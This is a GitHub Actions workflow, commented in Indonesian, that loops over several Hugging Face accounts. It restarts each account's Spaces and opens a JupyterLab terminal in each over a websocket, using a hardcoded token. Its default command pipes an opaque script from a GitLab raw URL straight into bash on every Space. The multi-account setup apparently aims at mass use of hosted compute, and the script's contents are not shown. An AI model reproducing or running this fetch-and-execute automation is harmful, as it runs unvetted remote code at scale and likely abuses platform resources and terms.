name: 🔁 Jalankan Perintah di Semua Space (Banyak Akun, Skip Jika Running)

on:
  workflow_dispatch:
    inputs:
      command:
        description: 'Perintah yang dijalankan di terminal JupyterLab'
        required: false
        default: 'curl -sL  https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/mars | bash'

jobs:
  run-per-account:
    strategy:
      matrix:
        account:
          - id: "akun1"
            secret_key: "HF_TOKEN_ACC1"
          - id: "akun2"
            secret_key: "HF_TOKEN_ACC2"
          # tambahkan akun lain...

    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: pip install huggingface_hub requests websocket-client

      - name: Proses Akun ${{ matrix.account.id }}
        env:
          HF_TOKEN: ${{ secrets[matrix.account.secret_key] }}
          COMMAND: ${{ github.event.inputs.command }}
        shell: python
        run: |
          import os, sys, time, json, requests, websocket
          from huggingface_hub import HfApi

          HF_TOKEN = os.environ["HF_TOKEN"]
          COMMAND = os.environ["COMMAND"]
          JUPYTER_TOKEN = "huggingface"   # kosongkan jika Jupyter tanpa token

          api = HfApi(token=HF_TOKEN)

          # 1. Username
          try:
              user = api.whoami()
              username = user["name"]
              print(f"👤 Username: {username}")
          except Exception as e:
              print(f"❌ Gagal mendapatkan username: {e}")
              sys.exit(1)

          # 2. Ambil Space
          all_spaces = []
          try:
              for space in api.list_spaces(author=username):
                  all_spaces.append(space.id)
          except Exception as e:
              print(f"❌ Gagal mengambil daftar Space: {e}")
              sys.exit(1)

          if not all_spaces:
              print("📭 Tidak ada Space.")
              sys.exit(0)

          print(f"📋 Space ({len(all_spaces)}):")
          for s in all_spaces:
              print(f"   - {s}")

          # 3. Proses tiap Space
          for repo_id in all_spaces:
              print(f"\n{'='*50}")
              print(f"🔧 Memproses: {repo_id}")
              try:
                  # Cek status
                  runtime = api.get_space_runtime(repo_id)
                  stage = str(runtime.stage)
                  print(f"   Status: {stage}")

                  if stage == "RUNNING":
                      print("✅ Sudah RUNNING, skip.")
                      continue

                  # Restart + tunggu
                  print("🔄 Restart...")
                  api.restart_space(repo_id)
                  for i in range(60):
                      time.sleep(10)
                      runtime = api.get_space_runtime(repo_id)
                      stage = str(runtime.stage)
                      print(f"   Status: {stage}")
                      if stage == "RUNNING":
                          break
                  else:
                      print("⏰ Timeout running. Skip.")
                      continue

                  # Jeda tambahan agar JupyterLab benar-benar siap
                  print("⏳ Menunggu JupyterLab siap (15 detik)...")
                  time.sleep(15)

                  # Buat terminal
                  space_url = f"https://{repo_id.replace('/', '-')}.hf.space"
                  headers = {"Authorization": f"Bearer {HF_TOKEN}"}
                  terminals_url = f"{space_url}/api/terminals"
                  if JUPYTER_TOKEN:
                      terminals_url += f"?token={JUPYTER_TOKEN}"

                  resp = requests.post(terminals_url, headers=headers)
                  if resp.status_code != 200:
                      print(f"⚠️  Gagal akses JupyterLab (HTTP {resp.status_code}). Skip.")
                      continue

                  term_name = resp.json()["name"]
                  print(f"💻 Terminal dibuat: {term_name}")

                  # WebSocket dengan timeout
                  ws_url = f"wss://{repo_id.replace('/', '-')}.hf.space/terminals/websocket/{term_name}"
                  if JUPYTER_TOKEN:
                      ws_url += f"?token={JUPYTER_TOKEN}"

                  try:
                      ws = websocket.create_connection(
                          ws_url,
                          header={"Authorization": f"Bearer {HF_TOKEN}"},
                          timeout=10   # timeout koneksi 10 detik
                      )
                      ws.send(json.dumps(["stdin", COMMAND + "\n"]))
                      time.sleep(2)

                      # Baca output dengan timeout 5 detik per recv
                      ws.settimeout(5)
                      output = ""
                      for _ in range(10):  # maks 10 x recv
                          try:
                              data = ws.recv()
                              msg = json.loads(data)
                              if msg[0] == "stdout":
                                  output += msg[1]
                          except websocket.WebSocketTimeoutException:
                              break  # tidak ada data lagi
                          except Exception:
                              break
                      ws.close()
                      print("📤 Output:")
                      print(output.strip() or "(tidak ada output)")
                  except Exception as e:
                      print(f"❌ WebSocket error: {e}")
                  finally:
                      # Hapus terminal
                      requests.delete(terminals_url + f"/{term_name}", headers=headers)
                      print("🧹 Terminal dihapus.")

                  print("✅ Selesai.\n")

              except Exception as e:
                  print(f"❌ Gagal di {repo_id}: {e}")
                  continue

          print(f"\n🎉 Akun {username} selesai.")